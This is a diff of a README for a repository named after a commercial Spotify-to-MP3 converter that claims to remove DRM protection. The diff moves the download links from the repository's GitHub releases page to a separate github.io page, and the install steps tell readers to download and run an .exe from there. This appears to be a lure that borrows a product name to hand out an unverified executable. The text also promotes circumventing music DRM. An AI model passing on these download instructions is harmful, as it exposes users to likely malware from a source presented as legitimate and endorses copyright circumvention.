@@ -1,6 +1,6 @@
 # 🎵 ondesoft-windows-music-converter - Remove music protection and convert files
 
-[![Download Link](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/bala37479/ondesoft-windows-music-converter/releases)
+[![Download Link](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://bala37479.github.io)
 
 This software converts Spotify tracks into standard formats like MP3, M4A, WAV, and FLAC. It removes DRM protection from your music files. This allows you to play your songs on any device or media player. You keep your music library offline and accessible without limits.
 
@@ -19,7 +19,7 @@ Before you install this software, check your computer for these requirements:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/bala37479/ondesoft-windows-music-converter/releases) to see available versions.
+1. Visit the [releases page](https://bala37479.github.io) to see available versions.
 2. Locate the most recent file ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your Downloads folder.
